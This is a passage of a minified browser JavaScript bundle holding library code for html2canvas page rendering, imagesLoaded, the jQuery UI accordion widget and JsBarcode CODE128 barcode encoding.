xa(p,e,f),(m=A.clonedReferenceElement)?[4,A.toIFrame(r,d)]:[2,Promise.reject("Unable to find element in cloned iframe")];case 1:return v=i.sent(),g=ia(m)||"HTML"===m.tagName?function(e){var t=e.body,n=e.documentElement;if(!t||!n)throw new Error("Unable to get document size");var r=Math.max(Math.max(t.scrollWidth,n.scrollWidth),Math.max(t.offsetWidth,n.offsetWidth),Math.max(t.clientWidth,n.clientWidth)),i=Math.max(Math.max(t.scrollHeight,n.scrollHeight),Math.max(t.offsetHeight,n.offsetHeight),Math.max(t.clientHeight,n.clientHeight));return new a(0,0,r,i)}(m.ownerDocument):o(p,m),y=g.width,b=g.height,_=g.left,w=g.top,C=Ro(p,m,t.backgroundColor),x={canvas:t.canvas,backgroundColor:C,scale:null!==(R=null!==(D=t.scale)&&void 0!==D?D:s.devicePixelRatio)&&void 0!==R?R:1,x:(null!==(j=t.x)&&void 0!==j?j:0)+_,y:(null!==(U=t.y)&&void 0!==U?U:0)+w,width:null!==($=t.width)&&void 0!==$?$:Math.ceil(y),height:null!==(z=t.height)&&void 0!==z?z:Math.ceil(b)},h?(p.logger.debug("Document cloned, using foreign object rendering"),[4,new Lo(p,x).render(m)]):[3,3];case 2:return S=i.sent(),[3,5];case 3:return p.logger.debug("Document cloned, element located at "+_+","+w+" with size "+y+"x"+b+" using computed rendering"),p.logger.debug("Starting DOM parsing"),k=Wi(p,m),C===k.styles.backgroundColor&&(k.styles.backgroundColor=At.TRANSPARENT),p.logger.debug("Starting renderer for element at "+x.x+","+x.y+" with size "+x.width+"x"+x.height),[4,new To(p,x).render(k)];case 4:S=i.sent(),i.label=5;case 5:return(null===(H=t.removeContainer)||void 0===H||H)&&(xa.destroy(v)||p.logger.error("Cannot detach cloned iframe as it is not in the DOM anymore")),p.logger.debug("Finished rendering"),[2,S]}}))}))}(e,t)}},"object"===_typeof2(n)&&void 0!==t?t.exports=i():"function"==typeof define&&define.amd?define(i):(r="undefined"!=typeof globalThis?globalThis:r||self).html2canvas=i()},{}],44:[function(e,t,n){n.read=function(e,t,n,r,i){var a,o,s=8*i-r-1,l=(1<<s)-1,c=l>>1,u=-7,d=n?i-1:0,p=n?-1:1,h=e[t+d];for(d+=p,a=h&(1<<-u)-1,h>>=-u,u+=s;0<u;a=256*a+e[t+d],d+=p,u-=8);for(o=a&(1<<-u)-1,a>>=-u,u+=r;0<u;o=256*o+e[t+d],d+=p,u-=8);if(0===a)a=1-c;else{if(a===l)return o?NaN:1/0*(h?-1:1);o+=Math.pow(2,r),a-=c}return(h?-1:1)*o*Math.pow(2,a-r)},n.write=function(e,t,n,r,i,a){var o,s,l,c=8*a-i-1,u=(1<<c)-1,d=u>>1,p=23===i?Math.pow(2,-24)-Math.pow(2,-77):0,h=r?0:a-1,f=r?1:-1,A=t<0||0===t&&1/t<0?1:0;for(t=Math.abs(t),isNaN(t)||t===1/0?(s=isNaN(t)?1:0,o=u):(o=Math.floor(Math.log(t)/Math.LN2),t*(l=Math.pow(2,-o))<1&&(o--,l*=2),2<=(t+=1<=o+d?p/l:p*Math.pow(2,1-d))*l&&(o++,l/=2),u<=o+d?(s=0,o=u):1<=o+d?(s=(t*l-1)*Math.pow(2,i),o+=d):(s=t*Math.pow(2,d-1)*Math.pow(2,i),o=0));8<=i;e[n+h]=255&s,h+=f,s/=256,i-=8);for(o=o<<i|s,c+=i;0<c;e[n+h]=255&o,h+=f,o/=256,c-=8);e[n+h-f]|=128*A}},{}],45:[function(e,t,n){var r,i;r="undefined"!=typeof window?window:this,i=function(e,t){var n=e.jQuery,r=e.console;function i(e,t){for(var n in t)e[n]=t[n];return e}var a=Array.prototype.slice;function o(e,t,s){if(!(this instanceof o))return new o(e,t,s);var l,c=e;"string"==typeof e&&(c=document.querySelectorAll(e)),c?(this.elements=(l=c,Array.isArray(l)?l:"object"==_typeof2(l)&&"number"==typeof l.length?a.call(l):[l]),this.options=i({},this.options),"function"==typeof t?s=t:i(this.options,t),s&&this.on("always",s),this.getImages(),n&&(this.jqDeferred=new n.Deferred),setTimeout(this.check.bind(this))):r.error("Bad element for imagesLoaded "+(c||e))}(o.prototype=Object.create(t.prototype)).options={},o.prototype.getImages=function(){this.images=[],this.elements.forEach(this.addElementImages,this)},o.prototype.addElementImages=function(e){"IMG"==e.nodeName&&this.addImage(e),!0===this.options.background&&this.addElementBackgroundImages(e);var t=e.nodeType;if(t&&s[t]){for(var n=e.querySelectorAll("img"),r=0;r<n.length;r++){var i=n[r];this.addImage(i)}if("string"==typeof this.options.background){var a=e.querySelectorAll(this.options.background);for(r=0;r<a.length;r++){var o=a[r];this.addElementBackgroundImages(o)}}}};var s={1:!0,9:!0,11:!0};function l(e){this.img=e}function c(e,t){this.url=e,this.element=t,this.img=new Image}return o.prototype.addElementBackgroundImages=function(e){var t=getComputedStyle(e);if(t)for(var n=/url\((['"])?(.*?)\1\)/gi,r=n.exec(t.backgroundImage);null!==r;){var i=r&&r[2];i&&this.addBackground(i,e),r=n.exec(t.backgroundImage)}},o.prototype.addImage=function(e){var t=new l(e);this.images.push(t)},o.prototype.addBackground=function(e,t){var n=new c(e,t);this.images.push(n)},o.prototype.check=function(){var e=this;function t(t,n,r){setTimeout((function(){e.progress(t,n,r)}))}this.progressedCount=0,this.hasAnyBroken=!1,this.images.length?this.images.forEach((function(e){e.once("progress",t),e.check()})):this.complete()},o.prototype.progress=function(e,t,n){this.progressedCount++,this.hasAnyBroken=this.hasAnyBroken||!e.isLoaded,this.emitEvent("progress",[this,e,t]),this.jqDeferred&&this.jqDeferred.notify&&this.jqDeferred.notify(this,e),this.progressedCount==this.images.length&&this.complete(),this.options.debug&&r&&r.log("progress: "+n,e,t)},o.prototype.complete=function(){var e=this.hasAnyBroken?"fail":"done";if(this.isComplete=!0,this.emitEvent(e,[this]),this.emitEvent("always",[this]),this.jqDeferred){var t=this.hasAnyBroken?"reject":"resolve";this.jqDeferred[t](this)}},(l.prototype=Object.create(t.prototype)).check=function(){this.getIsImageComplete()?this.confirm(0!==this.img.naturalWidth,"naturalWidth"):(this.proxyImage=new Image,this.proxyImage.addEventListener("load",this),this.proxyImage.addEventListener("error",this),this.img.addEventListener("load",this),this.img.addEventListener("error",this),this.proxyImage.src=this.img.src)},l.prototype.getIsImageComplete=function(){return this.img.complete&&this.img.naturalWidth},l.prototype.confirm=function(e,t){this.isLoaded=e,this.emitEvent("progress",[this,this.img,t])},l.prototype.handleEvent=function(e){var t="on"+e.type;this[t]&&this[t](e)},l.prototype.onload=function(){this.confirm(!0,"onload"),this.unbindEvents()},l.prototype.onerror=function(){this.confirm(!1,"onerror"),this.unbindEvents()},l.prototype.unbindEvents=function(){this.proxyImage.removeEventListener("load",this),this.proxyImage.removeEventListener("error",this),this.img.removeEventListener("load",this),this.img.removeEventListener("error",this)},(c.prototype=Object.create(l.prototype)).check=function(){this.img.addEventListener("load",this),this.img.addEventListener("error",this),this.img.src=this.url,this.getIsImageComplete()&&(this.confirm(0!==this.img.naturalWidth,"naturalWidth"),this.unbindEvents())},c.prototype.unbindEvents=function(){this.img.removeEventListener("load",this),this.img.removeEventListener("error",this)},c.prototype.confirm=function(e,t){this.isLoaded=e,this.emitEvent("progress",[this,this.element,t])},o.makeJQueryPlugin=function(t){(t=t||e.jQuery)&&((n=t).fn.imagesLoaded=function(e,t){return new o(this,e,t).jqDeferred.promise(n(this))})},o.makeJQueryPlugin(),o},"function"==typeof define&&define.amd?define(["ev-emitter/ev-emitter"],(function(e){return i(r,e)})):"object"==_typeof2(t)&&t.exports?t.exports=i(r,e("ev-emitter")):r.imagesLoaded=i(r,r.EvEmitter)},{"ev-emitter":39}],46:[function(e,t,n){var r;r=function(e){return e.widget("ui.accordion",{version:"1.12.1",options:{active:0,animate:{},classes:{"ui-accordion-header":"ui-corner-top","ui-accordion-header-collapsed":"ui-corner-all","ui-accordion-content":"ui-corner-bottom"},collapsible:!1,event:"click",header:"> li > :first-child, > :not(li):even",heightStyle:"auto",icons:{activeHeader:"ui-icon-triangle-1-s",header:"ui-icon-triangle-1-e"},activate:null,beforeActivate:null},hideProps:{borderTopWidth:"hide",borderBottomWidth:"hide",paddingTop:"hide",paddingBottom:"hide",height:"hide"},showProps:{borderTopWidth:"show",borderBottomWidth:"show",paddingTop:"show",paddingBottom:"show",height:"show"},_create:function(){var t=this.options;this.prevShow=this.prevHide=e(),this._addClass("ui-accordion","ui-widget ui-helper-reset"),this.element.attr("role","tablist"),t.collapsible||!1!==t.active&&null!=t.active||(t.active=0),this._processPanels(),t.active<0&&(t.active+=this.headers.length),this._refresh()},_getCreateEventData:function(){return{header:this.active,panel:this.active.length?this.active.next():e()}},_createIcons:function(){var t,n,r=this.options.icons;r&&(t=e("<span>"),this._addClass(t,"ui-accordion-header-icon","ui-icon "+r.header),t.prependTo(this.headers),n=this.active.children(".ui-accordion-header-icon"),this._removeClass(n,r.header)._addClass(n,null,r.activeHeader)._addClass(this.headers,"ui-accordion-icons"))},_destroyIcons:function(){this._removeClass(this.headers,"ui-accordion-icons"),this.headers.children(".ui-accordion-header-icon").remove()},_destroy:function(){var e;this.element.removeAttr("role"),this.headers.removeAttr("role aria-expanded aria-selected aria-controls tabIndex").removeUniqueId(),this._destroyIcons(),e=this.headers.next().css("display","").removeAttr("role aria-hidden aria-labelledby").removeUniqueId(),"content"!==this.options.heightStyle&&e.css("height","")},_setOption:function(e,t){"active"!==e?("event"===e&&(this.options.event&&this._off(this.headers,this.options.event),this._setupEvents(t)),this._super(e,t),"collapsible"!==e||t||!1!==this.options.active||this._activate(0),"icons"===e&&(this._destroyIcons(),t&&this._createIcons())):this._activate(t)},_setOptionDisabled:function(e){this._super(e),this.element.attr("aria-disabled",e),this._toggleClass(null,"ui-state-disabled",!!e),this._toggleClass(this.headers.add(this.headers.next()),null,"ui-state-disabled",!!e)},_keydown:function(t){if(!t.altKey&&!t.ctrlKey){var n=e.ui.keyCode,r=this.headers.length,i=this.headers.index(t.target),a=!1;switch(t.keyCode){case n.RIGHT:case n.DOWN:a=this.headers[(i+1)%r];break;case n.LEFT:case n.UP:a=this.headers[(i-1+r)%r];break;case n.SPACE:case n.ENTER:this._eventHandler(t);break;case n.HOME:a=this.headers[0];break;case n.END:a=this.headers[r-1]}a&&(e(t.target).attr("tabIndex",-1),e(a).attr("tabIndex",0),e(a).trigger("focus"),t.preventDefault())}},_panelKeyDown:function(t){t.keyCode===e.ui.keyCode.UP&&t.ctrlKey&&e(t.currentTarget).prev().trigger("focus")},refresh:function(){var t=this.options;this._processPanels(),!1===t.active&&!0===t.collapsible||!this.headers.length?(t.active=!1,this.active=e()):!1===t.active?this._activate(0):this.active.length&&!e.contains(this.element[0],this.active[0])?this.headers.length===this.headers.find(".ui-state-disabled").length?(t.active=!1,this.active=e()):this._activate(Math.max(0,t.active-1)):t.active=this.headers.index(this.active),this._destroyIcons(),this._refresh()},_processPanels:function(){var e=this.headers,t=this.panels;this.headers=this.element.find(this.options.header),this._addClass(this.headers,"ui-accordion-header ui-accordion-header-collapsed","ui-state-default"),this.panels=this.headers.next().filter(":not(.ui-accordion-content-active)").hide(),this._addClass(this.panels,"ui-accordion-content","ui-helper-reset ui-widget-content"),t&&(this._off(e.not(this.headers)),this._off(t.not(this.panels)))},_refresh:function(){var t,n=this.options,r=n.heightStyle,i=this.element.parent();this.active=this._findActive(n.active),this._addClass(this.active,"ui-accordion-header-active","ui-state-active")._removeClass(this.active,"ui-accordion-header-collapsed"),this._addClass(this.active.next(),"ui-accordion-content-active"),this.active.next().show(),this.headers.attr("role","tab").each((function(){var t=e(this),n=t.uniqueId().attr("id"),r=t.next(),i=r.uniqueId().attr("id");t.attr("aria-controls",i),r.attr("aria-labelledby",n)})).next().attr("role","tabpanel"),this.headers.not(this.active).attr({"aria-selected":"false","aria-expanded":"false",tabIndex:-1}).next().attr({"aria-hidden":"true"}).hide(),this.active.length?this.active.attr({"aria-selected":"true","aria-expanded":"true",tabIndex:0}).next().attr({"aria-hidden":"false"}):this.headers.eq(0).attr("tabIndex",0),this._createIcons(),this._setupEvents(n.event),"fill"===r?(t=i.height(),this.element.siblings(":visible").each((function(){var n=e(this),r=n.css("position");"absolute"!==r&&"fixed"!==r&&(t-=n.outerHeight(!0))})),this.headers.each((function(){t-=e(this).outerHeight(!0)})),this.headers.next().each((function(){e(this).height(Math.max(0,t-e(this).innerHeight()+e(this).height()))})).css("overflow","auto")):"auto"===r&&(t=0,this.headers.next().each((function(){var n=e(this).is(":visible");n||e(this).show(),t=Math.max(t,e(this).css("height","").height()),n||e(this).hide()})).height(t))},_activate:function(t){var n=this._findActive(t)[0];n!==this.active[0]&&(n=n||this.active[0],this._eventHandler({target:n,currentTarget:n,preventDefault:e.noop}))},_findActive:function(t){return"number"==typeof t?this.headers.eq(t):e()},_setupEvents:function(t){var n={keydown:"_keydown"};t&&e.each(t.split(" "),(function(e,t){n[t]="_eventHandler"})),this._off(this.headers.add(this.headers.next())),this._on(this.headers,n),this._on(this.headers.next(),{keydown:"_panelKeyDown"}),this._hoverable(this.headers),this._focusable(this.headers)},_eventHandler:function(t){var n,r,i=this.options,a=this.active,o=e(t.currentTarget),s=o[0]===a[0],l=s&&i.collapsible,c=l?e():o.next(),u=a.next(),d={oldHeader:a,oldPanel:u,newHeader:l?e():o,newPanel:c};t.preventDefault(),s&&!i.collapsible||!1===this._trigger("beforeActivate",t,d)||(i.active=!l&&this.headers.index(o),this.active=s?e():o,this._toggle(d),this._removeClass(a,"ui-accordion-header-active","ui-state-active"),i.icons&&(n=a.children(".ui-accordion-header-icon"),this._removeClass(n,null,i.icons.activeHeader)._addClass(n,null,i.icons.header)),s||(this._removeClass(o,"ui-accordion-header-collapsed")._addClass(o,"ui-accordion-header-active","ui-state-active"),i.icons&&(r=o.children(".ui-accordion-header-icon"),this._removeClass(r,null,i.icons.header)._addClass(r,null,i.icons.activeHeader)),this._addClass(o.next(),"ui-accordion-content-active")))},_toggle:function(t){var n=t.newPanel,r=this.prevShow.length?this.prevShow:t.oldPanel;this.prevShow.add(this.prevHide).stop(!0,!0),this.prevShow=n,this.prevHide=r,this.options.animate?this._animate(n,r,t):(r.hide(),n.show(),this._toggleComplete(t)),r.attr({"aria-hidden":"true"}),r.prev().attr({"aria-selected":"false","aria-expanded":"false"}),n.length&&r.length?r.prev().attr({tabIndex:-1,"aria-expanded":"false"}):n.length&&this.headers.filter((function(){return 0===parseInt(e(this).attr("tabIndex"),10)})).attr("tabIndex",-1),n.attr("aria-hidden","false").prev().attr({"aria-selected":"true","aria-expanded":"true",tabIndex:0})},_animate:function(e,t,n){var r,i,a,o=this,s=0,l=e.css("box-sizing"),c=e.length&&(!t.length||e.index()<t.index()),u=this.options.animate||{},d=c&&u.down||u,p=function(){o._toggleComplete(n)};return"number"==typeof d&&(a=d),"string"==typeof d&&(i=d),i=i||d.easing||u.easing,a=a||d.duration||u.duration,t.length?e.length?(r=e.show().outerHeight(),t.animate(this.hideProps,{duration:a,easing:i,step:function(e,t){t.now=Math.round(e)}}),void e.hide().animate(this.showProps,{duration:a,easing:i,complete:p,step:function(e,n){n.now=Math.round(e),"height"!==n.prop?"content-box"===l&&(s+=n.now):"content"!==o.options.heightStyle&&(n.now=Math.round(r-t.outerHeight()-s),s=0)}})):t.animate(this.hideProps,a,i,p):e.animate(this.showProps,a,i,p)},_toggleComplete:function(e){var t=e.oldPanel,n=t.prev();this._removeClass(t,"ui-accordion-content-active"),this._removeClass(n,"ui-accordion-header-active")._addClass(n,"ui-accordion-header-collapsed"),t.length&&(t.parent()[0].className=t.parent()[0].className),this._trigger("activate",null,e)}})},"function"==typeof define&&define.amd?define(["jquery","../version","../keycode","../unique-id","../widget"],r):r(jQuery)},{}],47:[function(e,t,n){var r=p(e("./barcodes/")),i=p(e("./help/merge.js")),a=p(e("./help/linearizeEncodings.js")),o=p(e("./help/fixOptions.js")),s=p(e("./help/getRenderProperties.js")),l=p(e("./help/optionsFromStrings.js")),c=p(e("./exceptions/ErrorHandler.js")),u=e("./exceptions/exceptions.js"),d=p(e("./options/defaults.js"));function p(e){return e&&e.__esModule?e:{default:e}}var h=function(){},f=function(e,t,n){var r=new h;if(void 0===e)throw Error("No element to render on was provided.");return r._renderProperties=(0,s.default)(e),r._encodings=[],r._options=d.default,r._errorHandler=new c.default(r),void 0!==t&&((n=n||{}).format||(n.format=g()),r.options(n)[n.format](t,n).render()),r};for(var A in f.getModule=function(e){return r.default[e]},r.default)r.default.hasOwnProperty(A)&&m(r.default,A);function m(e,t){h.prototype[t]=h.prototype[t.toUpperCase()]=h.prototype[t.toLowerCase()]=function(n,r){var a=this;return a._errorHandler.wrapBarcodeCall((function(){r.text=void 0===r.text?void 0:""+r.text;var o=(0,i.default)(a._options,r);o=(0,l.default)(o);var s=e[t],c=v(n,s,o);return a._encodings.push(c),a}))}}function v(e,t,n){var r=new t(e=""+e,n);if(!r.valid())throw new u.InvalidInputException(r.constructor.name,e);var o=r.encode();o=(0,a.default)(o);for(var s=0;s<o.length;s++)o[s].options=(0,i.default)(n,o[s].options);return o}function g(){return r.default.CODE128?"CODE128":Object.keys(r.default)[0]}function y(e,t,n){t=(0,a.default)(t);for(var r=0;r<t.length;r++)t[r].options=(0,i.default)(n,t[r].options),(0,o.default)(t[r].options);(0,o.default)(n),new e.renderer(e.element,t,n).render(),e.afterRender&&e.afterRender()}h.prototype.options=function(e){return this._options=(0,i.default)(this._options,e),this},h.prototype.blank=function(e){var t=new Array(e+1).join("0");return this._encodings.push({data:t}),this},h.prototype.init=function(){var e;if(this._renderProperties)for(var t in Array.isArray(this._renderProperties)||(this._renderProperties=[this._renderProperties]),this._renderProperties){e=this._renderProperties[t];var n=(0,i.default)(this._options,e.options);"auto"==n.format&&(n.format=g()),this._errorHandler.wrapBarcodeCall((function(){var t=v(n.value,r.default[n.format.toUpperCase()],n);y(e,t,n)}))}},h.prototype.render=function(){if(!this._renderProperties)throw new u.NoElementException;if(Array.isArray(this._renderProperties))for(var e=0;e<this._renderProperties.length;e++)y(this._renderProperties[e],this._encodings,this._options);else y(this._renderProperties,this._encodings,this._options);return this},h.prototype._defaults=d.default,"undefined"!=typeof window&&(window.JsBarcode=f),"undefined"!=typeof jQuery&&(jQuery.fn.JsBarcode=function(e,t){var n=[];return jQuery(this).each((function(){n.push(this)})),f(n,e,t)}),t.exports=f},{"./barcodes/":81,"./exceptions/ErrorHandler.js":83,"./exceptions/exceptions.js":84,"./help/fixOptions.js":85,"./help/getRenderProperties.js":87,"./help/linearizeEncodings.js":88,"./help/merge.js":89,"./help/optionsFromStrings.js":90,"./options/defaults.js":91}],48:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0}),n.default=function e(t,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.data=t,this.text=n.text||t,this.options=n}},{}],49:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r,i=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}(),a=(r=e("../Barcode.js"))&&r.__esModule?r:{default:r},o=e("./constants"),s=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var r=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e.substring(1),n));return r.bytes=e.split("").map((function(e){return e.charCodeAt(0)})),r}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,a.default),i(t,[{key:"valid",value:function(){return/^[\x00-\x7F\xC8-\xD3]+$/.test(this.data)}},{key:"encode",value:function(){var e=this.bytes,n=e.shift()-105,r=o.SET_BY_CODE[n];if(void 0===r)throw new RangeError("The encoding does not start with a start character.");!0===this.shouldEncodeAsEan128()&&e.unshift(o.FNC1);var i=t.next(e,1,r);return{text:this.text===this.data?this.text.replace(/[^\x20-\x7E]/g,""):this.text,data:t.getBar(n)+i.result+t.getBar((i.checksum+n)%o.MODULO)+t.getBar(o.STOP)}}},{key:"shouldEncodeAsEan128",value:function(){var e=this.options.ean128||!1;return"string"==typeof e&&(e="true"===e.toLowerCase()),e}}],[{key:"getBar",value:function(e){return o.BARS[e]?o.BARS[e].toString():""}},{key:"correctIndex",value:function(e,t){if(t!==o.SET_A)return t===o.SET_B?e.shift()-32:10*(e.shift()-48)+e.shift()-48;var n=e.shift();return n<32?n+64:n-32}},{key:"next",value:function(e,n,r){if(!e.length)return{result:"",checksum:0};var i=void 0,a=void 0;if(200<=e[0]){a=e.shift()-105;var s=o.SWAP[a];i=void 0!==s?t.next(e,n+1,s):(r!==o.SET_A&&r!==o.SET_B||a!==o.SHIFT||(e[0]=r===o.SET_A?95<e[0]?e[0]-96:e[0]:e[0]<32?e[0]+96:e[0]),t.next(e,n+1,r))}else a=t.correctIndex(e,r),i=t.next(e,n+1,r);var l=a*n;return{result:t.getBar(a)+i.result,checksum:l+i.checksum}}}]),t}();n.default=s},{"../Barcode.js":48,"./constants":55}],50:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r,i=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}(),a=(r=e("./CODE128.js"))&&r.__esModule?r:{default:r},o=e("./constants"),s=function(e){function t(e,n){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,o.A_START_CHAR+e,n))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,a.default),i(t,[{key:"valid",value:function(){return new RegExp("^"+o.A_CHARS+"+$").test(this.data)}}]),t}();n.default=s},{"./CODE128.js":49,"./constants":55}],51:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r,i=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}(),a=(r=e("./CODE128.js"))&&r.__esModule?r:{default:r},o=e("./constants"),s=function(e){function t(e,n){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,o.B_START_CHAR+e,n))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,a.default),i(t,[{key:"valid",value:function(){return new RegExp("^"+o.B_CHARS+"+$").test(this.data)}}]),t}();n.default=s},{"./CODE128.js":49,"./constants":55}],52:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r,i=function(){function e(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}return function(t,n,r){return n&&e(t.prototype,n),r&&e(t,r),t}}(),a=(r=e("./CODE128.js"))&&r.__esModule?r:{default:r},o=e("./constants"),s=function(e){function t(e,n){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,o.C_START_CHAR+e,n))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,a.default),i(t,[{key:"valid",value:function(){return new RegExp("^"+o.C_CHARS+"+$").test(this.data)}}]),t}();n.default=s},{"./CODE128.js":49,"./constants":55}],53:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r=a(e("./CODE128")),i=a(e("./auto"));function a(e){return e&&e.__esModule?e:{default:e}}function o(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!==_typeof2(t)&&"function"!=typeof t?e:t}var s=function(e){function t(e,n){if(function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),/^[\x00-\x7F\xC8-\xD3]+$/.test(e))var r=o(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,(0,i.default)(e),n));else r=o(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));return o(r)}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+_typeof2(t));e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,r.default),t}();n.default=s},{"./CODE128":49,"./auto":54}],54:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0});var r=e("./constants"),i=function(e){return e.match(new RegExp("^"+r.A_CHARS+"*"))[0].length},a=function(e){return e.match(new RegExp("^"+r.B_CHARS+"*"))[0].length},o=function(e){return e.match(new RegExp("^"+r.C_CHARS+"*"))[0]};function s(e,t){var n=t?r.A_CHARS:r.B_CHARS,i=e.match(new RegExp("^("+n+"+?)(([0-9]{2}){2,})([^0-9]|$)"));if(i)return i[1]+String.fromCharCode(204)+l(e.substring(i[1].length));var a=e.match(new RegExp("^"+n+"+"))[0];return a.length===e.length?e:a+String.fromCharCode(t?205:206)+s(e.substring(a.length),!t)}function l(e){var t=o(e),n=t.length;if(n===e.length)return e;e=e.substring(n);var r=i(e)>=a(e);return t+String.fromCharCode(r?206:205)+s(e,r)}n.default=function(e){var t=void 0;if(2<=o(e).length)t=r.C_START_CHAR+l(e);else{var n=i(e)>a(e);t=(n?r.A_START_CHAR:r.B_START_CHAR)+s(e,n)}return t.replace(/[\xCD\xCE]([^])[\xCD\xCE]/,(function(e,t){return String.fromCharCode(203)+t}))}},{"./constants":55}],55:[function(e,t,n){var r;function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}Object.defineProperty(n,"__esModule",{value:!0});var a=n.SET_A=0,o=n.SET_B=1,s=n.SET_C=2,l=(n.SHIFT=98,n.START_A=103),c=n.START_B=104,u=n.START_C=105;n.MODULO=103,n.STOP=106,n.FNC1=207,n.SET_BY_CODE=(i(r={},l,a),i(r,c,o),i(r,u,s),r),n.SWAP={101:a,100:o,99:s},n.A_START_CHAR=String.fromCharCode(208),n.B_START_CHAR=String.fromCharCode(209),n.C_START_CHAR=String.fromCharCode(210),n.A_CHARS="[\0-_È-Ï]",n.B_CHARS="[ -È-Ï]",n.C_CHARS="(Ï*[0-9]{2}Ï*)",n.BARS=[11011001100,11001101100,11001100110,10010011e3,10010001100,10001001100,10011001e3,10011000100,10001100100,11001001e3,11001000100,11000100100,10110011100,10011011100,10011001110,10111001100,10011101100,10011100110,11001110010,11001011100,11001001110,11011100100,11001110100,11101101110,11101001100,11100101100,11100100110,11101100100,11100110100,11100110010,11011011e3,11011000110,11000110110,10100011e3,10001011e3,10001000110,10110001e3,10001101e3,10001100010,11010001e3,11000101e3,11000100010,10110111e3,10110001110,10001101110,10111011e3,10111000110,10001110110,11101110110,11010001110,11000101110,11011101e3,11011100010,11011101110,11101011e3,11101000110,11100010110,11101101e3,11101100010,11100011010,11101111010,11001000010,11110001010,1010011e4,10100001100,1001011e4,10010000110,10000101100,10000100110,1011001e4,10110000100,1001101e4,10011000010,10000110100,10000110010,11000010010,1100101e4,11110111010,11000010100,10001111010,10100111100,10010111100,10010011110,10111100100,10011110100,10011110010,11110100100,11110010100,11110010010,11011011110,11011110110,11110110110,10101111e3,10100011110,10001011110,10111101e3,10111100010,11110101e3,11110100010,10111011110,10111101110,11101011110,11110101110,11010000100,1101001e4,11010011100,1100011101011]},{}],56:[function(e,t,n){Object.defineProperty(n,"__esModule",{value:!0}),n.CODE128C=n.CODE128B=n.CODE128A=n.CODE128=void 0;var r=s(e("./CODE128_AUTO.js")),i=s(e("./CODE128A.js")),a=s(e("./CODE128B.js")),o=s(e("./CODE128C.js"));function s(e){return 